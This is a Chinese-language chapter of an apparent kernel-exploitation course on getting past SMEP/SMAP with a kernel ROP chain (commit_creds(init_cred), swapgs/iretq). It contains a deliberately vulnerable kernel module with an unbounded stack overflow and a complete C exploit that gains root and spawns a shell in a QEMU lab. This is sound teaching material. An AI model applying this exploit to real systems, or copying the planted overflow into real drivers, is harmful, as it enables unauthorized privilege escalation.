# Ch 5 — SMEP / SMAP：commit_creds + prepare_kernel_cred ROP

> 目標：SMEP 把 ret2usr 打死、SMAP 把直接引用 user 指標打死。我們改走純 kernel ROP — 用 kernel text 裡既有的 gadget 拼出 `commit_creds(init_cred)` + 乾淨回 user。這是「現代 kernel exploit 必備的最小動作」。

## SMEP 與 SMAP 究竟是什麼

兩個 bit 在 CR4：

| bit | 名字 | 擋什麼 |
|---|---|---|
| CR4.SMEP (bit 20) | Supervisor Mode Execution Prevention | ring 0 執行 U=1 page 的指令 → #PF |
| CR4.SMAP (bit 21) | Supervisor Mode Access Prevention | ring 0 `mov` 讀寫 U=1 page → #PF（EFLAGS.AC=0 時） |

兩個都是 **硬體檢查**，CPU 層面，無法繞。kernel 能繞自己（透過 `stac`/`clac` 指令臨時把 EFLAGS.AC 設為 1，SMAP 檢查就暫時關掉 — 這正是 `copy_from_user` 內部在做的事），但攻擊者沒辦法 arbitrary 執行 `stac`，只能找已存在 gadget。

Ch 0 的 `run.sh` 已經 `-cpu qemu64,+smep,+smap`，現在我們把它當 baseline。

## 為什麼 ret2usr 直接廢了

SMEP 打開後，CPU 看到 ring 0 正要 fetch 一個 U=1 page 的指令 → #PF。你 Ch 4 放在 user-space 的 `kernel_payload` 跳進去 fetch 第一 byte 就爆。

解法：**不要跳去 user code**。改把整條邏輯用 kernel 裡既有的 gadget 串起來。這就是 kernel ROP（kROP）。

## `commit_creds(init_cred)` 的 ROP

目標：讓 kernel 依序執行

```c
commit_creds(init_cred);
swapgs;
iretq;   // 5-word frame 回 user
```

寫成 gadget chain：

```
ret addr on stack →  pop rdi ; ret               ; 用來裝參數
                     <init_cred addr>
                     <commit_creds addr>          ; call
                     swapgs_restore_regs_and_return_to_usermode  ; 出口（Ch 7 會細講）
                     或手動 swapgs;iretq gadget + 5-word frame
```

x86-64 SysV ABI 第一個參數在 rdi，所以要先 `pop rdi`。

### 找 gadget

kernel 裡 gadget 多到爆 — `vmlinux` 是幾十 MB 的 ELF。用 ropper 或 ROPgadget：

```bash
# host 上裝 ropper
pip install ropper

# 從 vmlinux 抓
ropper --file ~/kpwn/kernel/linux-6.6.60/vmlinux --search "pop rdi; ret"
# 0xffffffff81034a22: pop rdi; ret;
# ...
```

或用 `objdump`：

```bash
objdump -d ~/kpwn/kernel/linux-6.6.60/vmlinux \
  | grep -B1 "ret$" | grep "pop.*rdi" | head
```

gadget 地址在 KASLR 關掉時固定。Ch 6 會處理 KASLR leak 後怎麼動態算這些地址。

### `swapgs;iretq` gadget

kernel 裡有個現成出口叫 `swapgs_restore_regs_and_return_to_usermode`（`arch/x86/entry/entry_64.S` 定義），它會：

1. restore 一堆暫存器（從 `pt_regs`）
2. `swapgs`
3. `iretq`

地址：

```
/ # grep " swapgs_restore_regs_and_return_to_usermode$" /proc/kallsyms
ffffffff81e00e36 T swapgs_restore_regs_and_return_to_usermode
```

但它前幾行是 pop 回 `pt_regs`，你要**從它中間** jump 到 swapgs + iretq 那段才乾淨。通常偏移 `+0x17`（看版本）。gdb 進去 disas 確認：

```
(gdb) disas swapgs_restore_regs_and_return_to_usermode
...
+0x17: swapgs
+0x1a: jmp 0xffffffff81e00eXX  ; native_iretq
```

所以最終用的地址是 `swapgs_restore_regs_and_return_to_usermode + 0x17`。

## 完整 ROP chain

```
offset 0..63   : "A" * 64
offset 64..71  : canary (leak 後填回，先假設 leak 到了)
offset 72..79  : fake rbp
offset 80..87  : pop_rdi_ret
offset 88..95  : init_cred
offset 96..103 : commit_creds
offset 104..111: swapgs_restore + 0x17
offset 112..119: user_rip  (shell())
offset 120..127: user_cs
offset 128..135: user_rflags
offset 136..143: user_rsp
offset 144..151: user_ss
```

**等一下** — ROP chain 本身要放 80 byte 以上，但 `VULN_ECHO` 只吃 128 byte。算一下 gadget 數量夠不夠：128 - 80 = 48 byte = 6 個 gadget slot。剛剛好能塞下 `pop_rdi_ret, init_cred, commit_creds, swapgs+0x17, user_rip, user_cs`，但塞不下 `user_rflags, user_rsp, user_ss`。

**所以我們需要把 payload 擴到 ≥ 176 byte**。這意味著 Ch 2 那個 module 在 `VULN_ECHO` 內部 `copy_from_user(local, uarg, 128)` 固定拷 128 不夠。這章練習給一版 "big echo"：讓 size 從 user arg 傳進、ioctl 不檢查。

## Step 1 — 把 vuln module 加大一個洞

複製 Ch 2 的 module 做 v2：

```bash
cp -r ~/kpwn/module/ch02-vuln ~/kpwn/module/ch05-vuln
cd ~/kpwn/module/ch05-vuln
mv vuln.c vuln.c.bak
```

寫 `vuln.c`（改 ECHO 收一個 `struct {size, buf}`）：

```c
// ch05 vuln module
#include <linux/module.h>
#include <linux/miscdevice.h>
#include <linux/uaccess.h>

struct echo_req {
    size_t len;
    char __user *buf;
};

#define VULN_ECHO _IOW('v', 1, struct echo_req)

static long vuln_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
    char local[64];
    struct echo_req req;
    if (cmd != VULN_ECHO) return -ENOTTY;
    if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
    /* 洞：req.len 完全可控，無上限 */
    if (copy_from_user(local, req.buf, req.len)) return -EFAULT;
    return 0;
}
static const struct file_operations fops = {
    .owner = THIS_MODULE, .unlocked_ioctl = vuln_ioctl,
};
static struct miscdevice md = {
    .minor = MISC_DYNAMIC_MINOR, .name = "vuln", .fops = &fops, .mode = 0666,
};
static int __init m_init(void) { return misc_register(&md); }
static void __exit m_exit(void) { misc_deregister(&md); }
module_init(m_init); module_exit(m_exit);
MODULE_LICENSE("GPL");
```

Makefile 仿 Ch 2。

## Step 2 — 寫 exploit

`~/kpwn/exploit/ch05/exp.c`：

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>

struct echo_req { size_t len; char *buf; };
#define VULN_ECHO _IOW('v', 1, struct echo_req)

/* 從 kallsyms 抓，nokaslr 下固定 */
#define POP_RDI_RET   0xffffffff81034a22UL
#define COMMIT_CREDS  0xffffffff810c4b30UL
#define INIT_CRED     0xffffffff82e3c3e0UL
#define SWAPGS_RESTORE 0xffffffff81e00e4dUL  /* swapgs_restore + 0x17 */

/* 假設 canary 已由其他 primitive leak 出（練習 A 處理） */
#define LEAKED_CANARY 0xdeadbeefcafebabeUL

static unsigned long saved_cs, saved_ss, saved_rflags, saved_sp;

static void save_state(void) {
    asm volatile(
        "mov %%cs, %0\n mov %%ss, %1\n pushfq\n pop %2\n mov %%rsp, %3\n"
        : "=r"(saved_cs), "=r"(saved_ss), "=r"(saved_rflags), "=r"(saved_sp));
}
static void shell(void) { system("/bin/sh"); exit(0); }

int main(void) {
    save_state();
    int fd = open("/dev/vuln", O_RDWR);

    unsigned long chain[32];
    int i = 0;
    /* 填到 offset 64 之前的 local + canary + rbp */
    for (; i < 8; i++) chain[i] = 0x4141414141414141UL; /* local */
    chain[i++] = LEAKED_CANARY;                         /* canary */
    chain[i++] = 0x4242424242424242UL;                  /* fake rbp */
    /* ROP 開始 */
    chain[i++] = POP_RDI_RET;
    chain[i++] = INIT_CRED;
    chain[i++] = COMMIT_CREDS;
    chain[i++] = SWAPGS_RESTORE;
    /* iretq 的 5-word frame */
    chain[i++] = (unsigned long)shell;
    chain[i++] = saved_cs;
    chain[i++] = saved_rflags;
    chain[i++] = saved_sp;
    chain[i++] = saved_ss;

    struct echo_req req = { .len = i * 8, .buf = (char *)chain };
    ioctl(fd, VULN_ECHO, &req);
    /* iretq 會把我們送回 shell()，這行不會執行 */
    return 0;
}
```

編、跑（先關 canary 版的 kernel，或填對 leak 到的 canary）：

```bash
gcc -static -O0 -o ~/kpwn/exploit/ch05/exp ~/kpwn/exploit/ch05/exp.c
cp ~/kpwn/module/ch05-vuln/vuln.ko ~/kpwn/initramfs/
cp ~/kpwn/exploit/ch05/exp ~/kpwn/initramfs/home/user/
~/kpwn/scripts/make-initramfs.sh
~/kpwn/scripts/run-weak.sh   # 但改 -cpu 打開 SMEP+SMAP

# guest
/ # insmod /vuln.ko
/ # /home/user/exp
/ # id
uid=0(root) gid=0(root)
```

## SMAP 在這條 chain 上攔到了嗎？

注意：我們的 ROP chain **放在 user-space 的 `chain[]` 陣列裡**，kernel 是透過 `copy_from_user` 拷到自己 stack 再執行的。**整個 ROP 執行時 stack 在 kernel stack 上**（`pt_regs` 指向 kernel stack），SMAP 不檢查。

SMAP 會擋的是：kernel 的 gadget 裡如果有 `mov rax, [user_addr]` 這種直接引用 user 指標的操作。ROP 串起來本來就用 kernel 地址，不觸發 SMAP。**但如果你想 gadget 裡用 `leaq` 之類操作去讀 user buffer（避開 copy_from_user），SMAP 就會打到**。這在某些 exploit 策略裡（stack pivot 到 user memory）會卡，Ch 7 會碰到。

## 不能走 ret2usr，那為什麼還能走 ROP？

SMEP 只擋 **取指**（fetch 執行）。ROP chain 是 stack 上的一串**資料**（每個 8 byte），CPU 從 kernel stack ret 去 fetch 的永遠是 kernel 地址的指令（每個 gadget 都在 kernel text）。SMEP 不 care 資料地址。

**關鍵觀察**：SMEP 不防 ROP，只防 ret2usr。想真正防 ROP 要 CFI / KCFI（Ch 18）。

## Stack pivot：ROP 放不下怎麼辦

上面 chain 剛好塞進 160 byte（20 qword）。如果 module overflow 只給你 64 byte 能寫、但需要 300 byte ROP chain，怎麼辦？

**Stack pivot**：第一步用 `xchg rsp, rax; ret` 或 `mov rsp, rdi; ret` 這類 gadget 把 rsp 指到你預先準備好的大塊記憶體。

candidate 大塊記憶體位置：

- user-space mmap 出來的 buffer（SMAP 開了就卡住 — 要配合 SMAP bypass）
- `modprobe_path` 附近有些靜態大 buffer
- kernel heap 上你另外 spray 過的 chunk

這技巧 Ch 12 會深入（from heap to RIP）。此章知道概念即可。

## 常見踩雷

**`general protection fault` 在 `iretq`** — 5-word frame 順序錯。從高到低是 ss / rsp / rflags / cs / rip；push 也是這個順序（所以 pop 出來對）。

**`kernel panic - Attempted to kill init`** — exploit 拿 root 後回 user，但 `shell()` 沒 fork 直接 exec，初始 pid 1 的 shell 掉了。改成 `execve` 或 `system` 前先 `fork()`。

**`swapgs_restore_regs_and_return_to_usermode + 0x17` 在你 kernel 上偏移不對** — 版本差異。gdb 進去 `disas` 看，找 `swapgs` 那行的實際偏移。

**canary 填對 offset 錯** — `offsetof(vuln_ioctl, canary)` 不一定是 64。gdb 進 `vuln_ioctl` 看 prologue `mov [rsp+N], rax`，N 就是 canary offset。

**ROP gadget 在 kernel text 沒找到** — 某些 gadget 在小 kernel 可能不存在，換一個。`pop rdi; ret` 基本上永遠在。

## 動手練習

1. **寫 `search-gadgets.sh`**：封裝 `ropper` 查幾個常用 gadget（`pop rdi; ret`、`mov [rdi], rsi; ret`、`xchg rsp, rax; ret`）並輸出一張對照表。這腳本以後每次換 kernel 都要跑一次。
2. **改 ROP chain 不走 `swapgs_restore_regs_and_return_to_usermode`**，自己用 `swapgs; ret` + `iretq;` 兩段 gadget 接。驗證你理解出口的本質。
3. **把 KPTI 打開（移掉 `nopti`）重跑**。你會看到上面這個 exploit **掛在 iretq 那裡** — 這就是 Ch 7 要解的問題。
4. **把 `commit_creds(init_cred)` 換成「直接改 current->cred」** — 用 `mov [rdi+offset_cred], init_cred` 那種 write gadget。會卡在 `current` 怎麼拿（`%gs:current_task`）。這題折衷需要更長 chain，答案在 Ch 8。

## 自我檢核

- [ ] 知道 SMEP / SMAP 各自擋什麼（exec vs data access on U=1 pages）
- [ ] 能解釋為什麼 ROP 不觸發 SMEP
- [ ] 能寫出 `commit_creds(init_cred)` + 乾淨 iretq 回 user 的最短 ROP chain
- [ ] 知道 `swapgs_restore_regs_and_return_to_usermode + 0x17` 的意義
- [ ] 能從 vmlinux 找到 `pop rdi; ret` gadget
- [ ] 理解「為什麼這條 chain 還沒處理 KASLR 跟 KPTI」

下一章處理 KASLR — 上面所有 hardcode 的地址在 KASLR 下全部浮動，你需要 **leak 一個 kernel 地址** 才能算出 slide，所有 gadget 跟 `commit_creds` 都變成 `base + offset`。

→ [Ch 6 — KASLR 與 info leak：leak 途徑大全](./06-kaslr-infoleak.md)
